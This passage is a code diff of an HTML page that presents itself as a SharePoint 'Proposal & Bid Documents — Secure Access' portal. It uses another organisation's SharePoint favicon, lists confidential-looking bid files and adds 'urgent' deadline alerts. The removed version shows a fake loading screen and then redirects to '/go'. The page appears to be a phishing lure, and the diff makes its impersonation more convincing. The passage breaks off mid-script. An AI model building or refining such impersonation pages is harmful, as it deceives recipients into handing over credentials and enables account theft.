@@ -1,12 +1,10 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Proposal & Bid Documents — Secure Access</title>
-    <meta name="description"
-        content="Select and view your proposal & bidding documents.">
-    <link rel="icon" href="https://comunebresso.sharepoint.com/_layouts/15/images/favicon.ico?rev=43"
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SharePoint Document Portal</title>
+<link rel="icon" href="https://comunebresso.sharepoint.com/_layouts/15/images/favicon.ico?rev=43"
         type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -28,256 +26,190 @@
             }
         }
     </script>
-
-    <style>
-        html { scroll-behavior: smooth }
-        .bg-soft {
-            background:
-                radial-gradient(1000px 500px at 10% -10%, rgba(38, 74, 69, .08), transparent),
-                radial-gradient(1000px 500px at 90% -10%, rgba(38, 74, 69, .06), transparent)
-        }
-        button:focus-visible,
-        input:focus-visible {
-            outline: 2px solid #3A7A73;
-            outline-offset: 2px;
-        }
-        .pdf-icon { color: #e74c3c; }
-        .excel-icon { color: #217346; }
-		.loading-screen{
-    position:fixed;
-    inset:0;
-    background:rgba(255,255,255,.97);
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    z-index:99999;
-    opacity:0;
-    visibility:hidden;
-    transition:.3s ease;
-}
-
-.loading-screen.show{
-    opacity:1;
-    visibility:visible;
-}
-
-.loading-box{
-    text-align:center;
-}
-
-.loading-title{
-    font-size:22px;
-    font-weight:600;
-    color:#264A45;
-}
-
-.loading-subtitle{
-    margin-top:10px;
-    color:#64748b;
-    font-size:15px;
-}
-
-.dots{
-    margin-top:35px;
-}
-
-.dots span{
-    width:12px;
-    height:12px;
-    margin:0 5px;
-    display:inline-block;
-    border-radius:50%;
-    background:#264A45;
-    animation:bounce 1.2s infinite ease-in-out;
-}
-
-.dots span:nth-child(2){
-    animation-delay:.2s;
-}
-
-.dots span:nth-child(3){
-    animation-delay:.4s;
-}
-
-@keyframes bounce{
-    0%,80%,100%{
-        transform:scale(.35);
-        opacity:.35;
-    }
-
-    40%{
-        transform:scale(1);
-        opacity:1;
-    }
-}
-    </style>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,system-ui,sans-serif;background:#f3f2f1;color:#201f1e}
+  svg{display:block}
+  .suite{background:#038387;color:#fff}
+  .suite-inner{max-width:560px;margin:0 auto;height:44px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;position:relative;z-index:60}
+  .icon-btn{display:flex;align-items:center;justify-content:center;width:32px;height:32px;border-radius:4px;background:none;border:0;color:#fff;cursor:pointer;position:relative}
+  .icon-btn:hover{background:rgba(255,255,255,.15)}
+  .avatar{border-radius:50%;background:rgba(255,255,255,.2)}
+  .left-grp{display:flex;align-items:center;gap:12px}
+  .right-grp{display:flex;align-items:center;gap:4px}
+  .brand{font-size:14px;font-weight:600;letter-spacing:.5px}
+  .notif-badge{position:absolute;top:-2px;right:-2px;display:flex;align-items:center;justify-content:center;min-width:16px;height:16px;border-radius:999px;background:#d13438;color:#fff;font-size:10px;font-weight:700;padding:0 4px}
+  .search-box{display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.15);border-radius:4px;padding:6px 8px}
+  .search-box input{width:112px;background:none;border:0;color:#fff;font-size:12px;font-family:inherit;outline:none}
+  .search-box input::placeholder{color:rgba(255,255,255,.6)}
+  .search-box .clear{background:none;border:0;color:rgba(255,255,255,.6);cursor:pointer;padding:0;display:flex;align-items:center}
+  .search-box .clear:hover{color:#fff}
+  .dropdown{position:absolute;top:calc(100% + 6px);background:#fff;border:1px solid #edebe9;border-radius:8px;box-shadow:0 8px 24px rgba(0,0,0,.15);z-index:70;overflow:hidden}
+  .dd-head{border-bottom:1px solid #edebe9;padding:8px 12px;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:#605e5c}
+  .dd-item{display:flex;align-items:center;gap:12px;width:100%;padding:8px 12px;text-align:left;font-size:13px;color:#201f1e;background:none;border:0;cursor:pointer;font-family:inherit}
+  .dd-item:hover{background:#f3f2f1}
+  .dd-item.active{background:#e0f3f3;color:#038387}
+  .dd-item .chk{margin-left:auto;display:flex;color:#038387}
+  .backdrop{position:fixed;inset:0;z-index:55}
+  .notif-panel{width:288px}
+  .notif-list{max-height:288px;overflow-y:auto}
+  .notif-item{display:flex;align-items:flex-start;gap:12px;padding:12px 16px;border-top:1px solid #edebe9}
+  .notif-item:first-child{border-top:0}
+  .notif-ic{flex-shrink:0;width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-top:2px}
+  .notif-ic.over{background:#fde7e9;color:#d13438}
+  .notif-ic.soon{background:#fdf2d7;color:#ca5010}
+  .notif-ic.track{background:#dff6dd;color:#107c10}
+  .notif-name{font-size:12px;font-weight:500;color:#201f1e;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:200px}
+  .notif-sub{margin-top:2px;display:flex;align-items:center;gap:8px}
+  .notif-label{font-size:11px;font-weight:500}
+  .notif-label.over{color:#d13438}
+  .notif-label.soon{color:#ca5010}
+  .notif-label.track{color:#107c10}
+  .notif-when{font-size:11px;color:#605e5c}
+  .notif-foot{border-top:1px solid #edebe9;background:#faf9f8;padding:10px 16px;text-align:center;font-size:11px;color:#605e5c}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(135deg,#026d70,#038387,#01595c)}
+  .blob1{position:absolute;top:-80px;right:-40px;width:256px;height:256px;border-radius:50%;background:rgba(255,255,255,.1);filter:blur(48px)}
+  .banner-inner{position:relative;max-width:560px;margin:0 auto;padding:40px 24px;text-align:center}
+  .badge{display:inline-flex;align-items:center;gap:8px;border:1px solid rgba(255,255,255,.2);background:rgba(255,255,255,.1);color:#fff;border-radius:999px;padding:6px 16px;font-size:12px;font-weight:500}
+  .banner h1{margin-top:16px;color:#fff;font-size:22px;font-weight:600;text-transform:uppercase;letter-spacing:-.3px}
+  .banner .sub{margin:8px auto 0;max-width:480px;color:rgba(224,247,247,.8);font-size:14px}
+  .meta{margin-top:16px;display:flex;align-items:center;justify-content:center;gap:16px;font-size:12px;font-weight:500;color:rgba(224,247,247,.7)}
+  .dot{width:4px;height:4px;border-radius:50%;background:rgba(255,255,255,.4)}
+  main{max-width:560px;margin:0 auto;padding:24px 16px 96px}
+  .card{background:#fff;border:1px solid #edebe9;border-radius:8px;overflow:hidden;box-shadow:0 1px 2px rgba(0,0,0,.04)}
+  .cmd{display:flex;align-items:center;justify-content:space-between;gap:16px;border-bottom:1px solid #edebe9;padding:12px 20px}
+  .cmd-left{display:flex;align-items:center;gap:12px}
+  .cmd-icon{width:40px;height:40px;border-radius:12px;background:#038387;color:#fff;display:flex;align-items:center;justify-content:center}
+  .cmd h2{font-size:15px;font-weight:600;color:#201f1e}
+  .cmd .sub{font-size:12px;color:#605e5c}
+  .btn{display:inline-flex;align-items:center;gap:8px;border:1px solid #edebe9;background:#fff;color:#605e5c;border-radius:6px;padding:6px 12px;font-size:12px;font-weight:500;cursor:pointer;font-family:inherit}
+  .btn:hover{background:#f3f2f1}
+  .btn.on{border-color:#038387;background:#e0f3f3;color:#038387}
+  .list .row{display:flex;align-items:center;gap:16px;padding:12px 20px;border-top:1px solid #edebe9;cursor:pointer;transition:background .15s}
+  .list .row:first-child{border-top:0}
+  .list .row:hover{background:#f3f2f1}
+  .list .row.sel{background:#e0f3f3}
+  .cb{width:20px;height:20px;border:1px solid #605e5c;border-radius:4px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .15s}
+  .list .row.sel .cb{background:#038387;border-color:#038387}
+  .cb svg{opacity:0;color:#fff}
+  .list .row.sel .cb svg{opacity:1}
+  .ficon{width:40px;height:40px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+  .pdf{background:#fde7e9;color:#d13438}
+  .xls{background:#dff6dd;color:#107c10}
+  .finfo{flex:1;min-width:0}
+  .fname{font-size:14px;font-weight:500;color:#201f1e;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .ftype{margin-top:2px;font-size:12px;color:#605e5c}
+  .tag{flex-shrink:0;background:#f3f2f1;border-radius:999px;padding:4px 10px;font-size:11px;font-weight:500;color:#605e5c}
+  .empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:64px 0;text-align:center}
+  .empty p{font-size:14px;font-weight:500;color:#605e5c}
+  .empty .empty-sub{margin-top:4px;font-size:12px;color:#a19f9d}
+  .foot{margin-top:24px;text-align:center;font-size:12px;color:#605e5c}
+  .bar{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);width:calc(100% - 24px);max-width:448px;z-index:40}
+  .bar-inner{display:flex;align-items:center;gap:12px;background:rgba(32,31,30,.95);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:12px 16px;box-shadow:0 12px 32px rgba(0,0,0,.3)}
+  .count{width:28px;height:28px;border-radius:50%;background:#038387;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600}
+  .clabel{font-size:14px;font-weight:500;color:#f1f5f9}
+  .bar-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+  .clear{width:36px;height:36px;border-radius:8px;border:0;background:none;color:#cbd5e1;cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .clear:hover{background:rgba(255,255,255,.1);color:#fff}
+  .view{display:inline-flex;align-items:center;gap:8px;background:#038387;color:#fff;border:0;border-radius:8px;padding:10px 16px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
+  .view:hover{background:#026d70}
+  .hidden{display:none!important}
+  .overlay{position:fixed;inset:0;z-index:50;display:flex;align-items:flex-end;justify-content:center;background:rgba(15,23,42,.4)}
+  @media(min-width:640px){.overlay{align-items:center}}
+  .dialog{display:flex;flex-direction:column;max-height:85vh;width:100%;max-width:640px;background:#fff;border-radius:16px 16px 0 0;overflow:hidden;box-shadow:0 25px 50px rgba(0,0,0,.25)}
+  @media(min-width:640px){.dialog{border-radius:16px}}
+  .dlg-head{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f1f5f9;padding:20px 24px}
+  .dlg-head-left{display:flex;align-items:center;gap:12px}
+  .dlg-icon{width:36px;height:36px;border-radius:8px;background:#e0f3f3;display:flex;align-items:center;justify-content:center;color:#038387}
+  .dlg-title{font-size:18px;font-weight:600;color:#0f172a}
+  .dlg-sub{font-size:12px;color:#94a3b8}
+  .dlg-close{width:32px;height:32px;border-radius:50%;border:0;background:none;color:#94a3b8;cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .dlg-close:hover{background:#f1f5f9;color:#334155}
+  .dlg-list{flex:1;overflow-y:auto;padding:16px 24px}
+  .dlg-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:64px 0;text-align:center}
+  .dlg-empty p{margin-top:16px;font-size:14px;font-weight:500;color:#475569}
+  .dlg-empty .empty-sub{margin-top:4px;font-size:12px;color:#94a3b8}
+  .dlg-item{display:flex;align-items:center;gap:16px;padding:14px 0;border-bottom:1px solid #f1f5f9}
+  .dlg-item:last-child{border-bottom:0}
+  .dlg-item .ficon{border-radius:12px}
+  .dlg-item .finfo .fname{font-size:14px;font-weight:500;color:#1e293b}
+  .dlg-item .ftype{font-size:12px;color:#94a3b8}
+  .dlg-remove{width:32px;height:32px;border-radius:50%;border:0;background:none;color:#cbd5e1;cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .dlg-remove:hover{background:#fef2f2;color:#ef4444}
+  .dlg-foot{display:flex;align-items:center;justify-content:space-between;gap:12px;border-top:1px solid #f1f5f9;background:rgba(248,250,252,.5);padding:16px 24px}
+  .dlg-foot .conf{font-size:12px;color:#64748b}
+  .review-link{display:inline-flex;align-items:center;gap:8px;background:#038387;color:#fff;border-radius:8px;padding:8px 16px;font-size:14px;font-weight:500;text-decoration:none;cursor:pointer;border:0;font-family:inherit}
+  .review-link:hover{background:#026d70}
+  .ld-overlay{position:fixed;inset:0;z-index:80;display:flex;align-items:center;justify-content:center;background:rgba(247,250,252,.95);backdrop-filter:blur(4px)}
+  .ld-box{background:#fff;border-radius:16px;padding:48px 40px;box-shadow:0 25px 50px rgba(0,0,0,.15);display:flex;flex-direction:column;align-items:center;margin:0 16px}
+  .ld-title{font-size:18px;font-weight:700;color:#1a3c34}
+  .ld-sub{margin-top:8px;font-size:14px;color:#4a5568}
+  .ld-dots{margin-top:24px;display:flex;align-items:center;gap:10px}
+  .ld-dot{width:10px;height:10px;border-radius:50%;background:#cbd5e0;transition:background .3s}
+  .ld-dot.on{background:#1a3c34}
+</style>
 </head>
-
-<body class="min-h-screen bg-white text-slate-800">
-
-<header class="text-white bg-brand-600">
-    <div class="max-w-4xl px-4 py-10 mx-auto text-center">
-        <h1 class="text-2xl font-semibold tracking-tight md:text-3xl">
-            Proposal & Bid Documents — Secure Access
-        </h1>
-        <p class="mt-2 text-white/80">
-            Select files below and view them instantly.
-        </p>
-    </div>
-</header>
-
-<main class="bg-soft">
-    <div class="max-w-4xl px-4 mx-auto">
-
-        <section class="p-6 -mt-8 bg-white border md:-mt-10 border-slate-200 rounded-2xl shadow-soft md:p-8">
-            <div class="flex items-start justify-between gap-4">
-                <div>
-                    <h2 class="text-xl font-semibold">Available Files</h2>
-                    <p class="mt-1 text-sm text-slate-500">Choose what you need. You can select all.</p>
-                </div>
-                <button id="btnSelectAll" type="button"
-                    class="inline-flex items-center gap-2 px-3 py-2 text-sm border rounded-xl border-slate-300 hover:bg-slate-50">
-                    <i class="fas fa-bars w-4 h-4"></i>
-                    <span>Select All</span>
-                </button>
-            </div>
-
-            <ul id="docList" class="mt-6 divide-y divide-slate-200">
-
-                <li class="flex items-center justify-between gap-4 py-3">
-                    <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
-                            data-file="RFP Overview Document.pdf">
-                        <span class="font-medium">
-                            <i class="fas fa-file-excel excel-icon"></i> RFP Overview Document
-                        </span>
-                    </label>
-                    <span class="text-xs text-slate-500">Q4 2026</span>
-                </li>
-
-                <li class="flex items-center justify-between gap-4 py-3">
-                    <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
-                            data-file="Scope of Work & Specifications.pdf">
-                        <span class="font-medium">
-                            <i class="fas fa-file-pdf pdf-icon"></i> Scope of Work & Specifications
-                        </span>
-                    </label>
-                    <span class="text-xs text-slate-500">Q4 2026</span>
-                </li>
-
-                <li class="flex items-center justify-between gap-4 py-3">
-                    <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
-                            data-file="Bid Submission Guidelines.pdf">
-                        <span class="font-medium">
-                            <i class="fas fa-file-pdf pdf-icon"></i> Bid Submission Guidelines
-                        </span>
-                    </label>
-                    <span class="text-xs text-slate-500">Q4 2026</span>
-                </li>
-
-                <li class="flex items-center justify-between gap-4 py-3">
-                    <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
-                            data-file="Compliance Requirements.pdf">
-                        <span class="font-medium">
-                            <i class="fas fa-file-excel excel-icon"></i> Compliance Requirements
-                        </span>
-                    </label>
-                    <span class="text-xs text-slate-500">Q4 2026</span>
-                </li>
-
-                <li class="flex items-center justify-between gap-4 py-3">
-                    <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
-                            data-file="Contract Terms & Conditions.pdf">
-                        <span class="font-medium">
-                            <i class="fas fa-file-pdf pdf-icon"></i> Contract Terms & Conditions
-                        </span>
-                    </label>
-                    <span class="text-xs text-slate-500">Q4 2026</span>
-                </li>
-
-            </ul>
-
-            <div class="flex flex-col items-stretch gap-3 mt-6 sm:flex-row sm:items-center">
-                <button id="btnView" type="button"
-                    class="w-full sm:w-auto inline-flex justify-center items-center gap-2 rounded-xl bg-brand-600 text-white px-5 py-3 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-[#2F5E58]"
-                    disabled>
-                    <i class="fas fa-eye"></i>
-                    <span>View Selected</span>
-                    <span id="countBadge"
-                        class="ml-1 inline-flex items-center justify-center rounded-md bg-white/20 px-2 py-0.5 text-xs">0</span>
-                </button>
-            </div>
-
-        </section>
-
-        <footer class="py-10 text-xs text-center text-slate-500">
-            © 2026 SharePoint Document Portal — Confidential For Intended Recipient Only
-        </footer>
-
-    </div>
-</main>
-<div id="loadingScreen" class="loading-screen">
-    <div class="loading-box">
-        <div class="loading-title">Preparing selected documents</div>
-        <div class="loading-subtitle">
-            Please wait while we open your selected files.
-        </div>
-
-        <div class="dots">
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
-    </div>
-</div>
+<body>
+<svg width="0" height="0" style="position:absolute"><defs>
+<symbol id="i-grid" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></symbol>
+<symbol id="i-search" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></symbol>
+<symbol id="i-bell" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></symbol>
+<symbol id="i-user" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></symbol>
+<symbol id="i-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></symbol>
+<symbol id="i-pdf" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v5h5"/><path d="M16 13H8"/><path d="M16 17H8"/><path d="M10 9H8"/></symbol>
+<symbol id="i-xls" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v5h5"/><path d="M8 13h8"/><path d="M8 17h8"/><path d="M12 13v4"/></symbol>
+<symbol id="i-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></symbol>
+<symbol id="i-listchecks" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m3 17 2 2 4-4"/><path d="m3 7 2 2 4-4"/><path d="M13 6h8"/><path d="M13 10h8"/><path d="M13 14h8"/><path d="M13 18h8"/></symbol>
+<symbol id="i-stack" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 7h-3a2 2 0 0 1-2-2V2"/><path d="M3 13a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M8 13h4"/></symbol>
+<symbol id="i-eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></symbol>
+<symbol id="i-x" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></symbol>
+<symbol id="i-filesearch" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h6"/><path d="M14 2v5h5"/><circle cx="11" cy="13" r="3"/><path d="m15 17 3 3"/></symbol>
+<symbol id="i-layers" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83Z"/><path d="m22 17.65-9.17 4.16a2 2 0 0 1-1.66 0L2 17.65"/><path d="m22 12.65-9.17 4.16a2 2 0 0 1-1.66 0L2 12.65"/></symbol>
+<symbol id="i-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></symbol>
+<symbol id="i-alert" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></symbol>
+<symbol id="i-checkcircle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="m9 11 3 3L22 4"/></symbol>
+</defs></svg>
+<div class="suite"><div class="suite-inner"><div class="left-grp"><div style="position:relative"><button id="filterBtn" class="icon-btn" aria-label="Filter files by type"><svg width="16" height="16"><use href="#i-grid"/></svg></button><div id="filterMenu" class="dropdown hidden" style="left:0;width:208px"><div class="dd-head">Filter by type</div><div id="filterOptions"></div></div></div><span class="brand">SharePoint</span></div><div class="right-grp"><div id="searchSlot"></div><div style="position:relative"><button id="notifBtn" class="icon-btn" aria-label="Notifications"><svg width="16" height="16"><use href="#i-bell"/></svg><span id="notifBadge" class="notif-badge hidden">0</span></button><div id="notifPanel" class="dropdown notif-panel hidden" style="right:0"></div></div><button class="icon-btn avatar" aria-label="Account"><svg width="16" height="16"><use href="#i-user"/></svg></button></div></div></div>
+<div class="banner"><div class="blob1"></div><div class="banner-inner"><div class="badge"><svg width="14" height="14"><use href="#i-lock"/></svg>Secure Document Access</div><h1>Proposal &amp; Bid Documents</h1><p class="sub">Select the files you need below and review them instantly in a curated preview.</p><div class="meta"><span id="docCount">5 Documents</span><span class="dot"></span><span>Q4 2026 Cycle</span></div></div></div>
+<main><div class="card"><div class="cmd"><div class="cmd-left"><div class="cmd-icon"><svg width="20" height="20"><use href="#i-stack"/></svg></div><div><h2>Available Files</h2><div class="sub">Choose what you need — you can select all.</div></div></div><button id="selectAll" class="btn"><svg width="16" height="16"><use href="#i-listchecks"/></svg><span id="saLabel">Select All</span></button></div><div id="fileList" class="list"></div></div><p class="foot">&copy; 2026 SharePoint Document Portal — Confidential, for intended recipient only.</p></main>
+<div id="actionBar" class="bar hidden"><div class="bar-inner"><span id="countBadge" class="count">0</span><span id="countLabel" class="clabel">files selected</span><div class="bar-right"><button id="clearBtn" class="clear"><svg width="18" height="18"><use href="#i-x"/></svg></button><button id="viewBtn" class="view"><svg width="16" height="16"><use href="#i-eye"/></svg>View Selected</button></div></div></div>
+<div id="loadingOverlay" class="ld-overlay hidden"><div class="ld-box"><div class="ld-title">Preparing selected documents</div><div class="ld-sub">Please wait while we open your selected files.</div><div class="ld-dots"><span class="ld-dot" id="ldDot0"></span><span class="ld-dot" id="ldDot1"></span><span class="ld-dot" id="ldDot2"></span></div></div></div>
+<div id="dialogOverlay" class="overlay hidden"><div class="dialog"><div class="dlg-head"><div class="dlg-head-left"><div class="dlg-icon"><svg width="18" height="18"><use href="#i-eye"/></svg></div><div><div class="dlg-title">Selected Documents</div><div id="dlgSub" class="dlg-sub">0 files ready to review</div></div></div><button id="dlgClose" class="dlg-close"><svg width="18" height="18"><use href="#i-x"/></svg></button></div><div id="dlgList" class="dlg-list"></div><div id="dlgFoot" class="dlg-foot hidden"><span class="conf">Confidential — intended recipient only</span><button id="reviewBtn" class="review-link"><svg width="16" height="16"><use href="#i-filesearch"/></svg>Review</button></div></div></div>
 <script>
-    const checkboxes = Array.from(document.querySelectorAll('#docList input[type="checkbox"]'));
-    const btnView = document.getElementById('btnView');
-    const btnSelectAll = document.getElementById('btnSelectAll');
-    const countBadge = document.getElementById('countBadge');
-
-    function updateState() {
-        const selected = checkboxes.filter(cb => cb.checked);
-        countBadge.textContent = selected.length;
-        btnView.disabled = selected.length === 0;
-    }
-
-    checkboxes.forEach(cb => cb.addEventListener('change', updateState));
-
-    // Only add the event if the button exists
-    if (btnSelectAll) {
-        btnSelectAll.addEventListener('click', () => {
-            const allChecked = checkboxes.every(cb => cb.checked);
-            checkboxes.forEach(cb => cb.checked = !allChecked);
-            updateState();
-        });
-    }
-
-    btnView.addEventListener('click', () => {
-
-    const selected = checkboxes.filter(cb => cb.checked);
-
-    if(selected.length === 0) return;
-
-    document
-        .getElementById("loadingScreen")
-        .classList
-        .add("show");
-
-    setTimeout(() => {
-
-        window.location.href="/go";
-
-    },1800);
-
-});
-
-    updateState();
+var FILES=[{id:"f1",name:"RFP Overview Document",t:"xls",size:"248 KB",due:"2026-07-25"},{id:"f2",name:"Scope of Work & Specifications",t:"pdf",size:"1.2 MB",due:"2026-07-22"},{id:"f3",name:"Bid Submission Guidelines",t:"pdf",size:"864 KB",due:"2026-07-28"},{id:"f4",name:"Compliance Requirements",t:"xls",size:"312 KB",due:"2026-07-24"},{id:"f5",name:"Contract Terms & Conditions",t:"pdf",size:"1.8 MB",due:"2026-08-02"}];
+var T={pdf:{i:"i-pdf",l:"PDF"},xls:{i:"i-xls",l:"XLSX"}};
+var FILTERS=[{v:"all",l:"All Files",i:"i-layers"},{v:"pdf",l:"PDF Documents",i:"i-pdf"},{v:"xls",l:"Spreadsheets",i:"i-xls"}];
+var sel={};
+var activeFilter="all";
+var searchQuery="";
+var searchExpanded=false;
+function $(id){return document.getElementById(id);}
+function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function getFiltered(){return FILES.filter(function(f){var ms=!searchQuery||f.name.toLowerCase().indexOf(searchQuery.toLowerCase())>=0;var mf=activeFilter==="all"||f.t===activeFilter;return ms&&mf;});}
+function getSelected(){return FILES.filter(function(f){return sel[f.id];});}
+function getDaysUntil(ds){var t=new Date();t.setHours(0,0,0,0);var d=new Date(ds+"T00:00:00");return Math.round((d-t)/86400000);}
+function getAlertMeta(days){if(days<0)return{label:"Overdue",cls:"over",ic:"i-alert"};if(days<=2)return{label:"Due soon",cls:"soon",ic:"i-clock"};return{label:"On track",cls:"track",ic:"i-checkcircle"};}
+function rowHTML(f){var c=T[f.t];return '<div class="row'+(sel[f.id]?' sel':'')+'" data-row="'+f.id+'"><div class="cb"><svg width="14" height="14"><use href="#i-check"/></svg></div><div class="ficon '+f.t+'"><svg width="20" height="20"><use href="#'+c.i+'"/></svg></div><div class="finfo"><div class="fname">'+esc(f.name)+'</div><div class="ftype">'+c.l+' &middot; '+f.size+'</div></div><span class="tag">Q4 2026</span></div>';}
+function dlgItemHTML(f){var c=T[f.t];return '<div class="dlg-item"><div class="ficon '+f.t+'"><svg width="20" height="20"><use href="#'+c.i+'"/></svg></div><div class="finfo"><div class="fname">'+esc(f.name)+'</div><div class="ftype">'+c.l+' &middot; '+f.size+' &middot; Q4 2026</div></div><button class="dlg-remove" data-remove="'+f.id+'"><svg width="16" height="16"><use href="#i-x"/></svg></button></div>';}
+function renderFilterOptions(){var h="";FILTERS.forEach(function(o){var a=activeFilter===o.v;h+='<button class="dd-item'+(a?' active':'')+'" data-filter="'+o.v+'"><svg width="16" height="16"><use href="#'+o.i+'"/></svg><span>'+o.l+'</span>'+(a?'<span class="chk"><svg width="14" height="14"><use href="#i-check"/></svg></span>':'')+'</button>';});$("filterOptions").innerHTML=h;}
+function renderNotif(){var rem=FILES.map(function(f){return{id:f.id,name:f.name,days:getDaysUntil(f.due)};}).sort(function(a,b){return a.days-b.days;});var urgent=rem.filter(function(r){return r.days<=2;}).length;$("notifBadge").textContent=urgent;$("notifBadge").className="notif-badge"+(urgent>0?"":" hidden");var h='<div class="dd-head" style="display:flex;align-items:center;justify-content:space-between"><span>Deadline Alerts</span><span style="font-size:10px;font-weight:500;color:#d13438;background:#fde7e9;border-radius:999px;padding:2px 8px">'+urgent+' urgent</span></div><div class="notif-list">';rem.forEach(function(r){var m=getAlertMeta(r.days);var when=r.days<0?Math.abs(r.days)+" day(s) overdue":r.days===0?"Due today":"Due in "+r.days+" day(s)";h+='<div class="notif-item"><div class="notif-ic '+m.cls+'"><svg width="14" height="14"><use href="#'+m.ic+'"/></svg></div><div style="flex:1;min-width:0"><div class="notif-name">'+esc(r.name)+'</div><div class="notif-sub"><span class="notif-label '+m.cls+'">'+m.label+'</span><span class="notif-when">'+when+'</span></div></div></div>';});h+='</div><div class="notif-foot">Review deadlines for 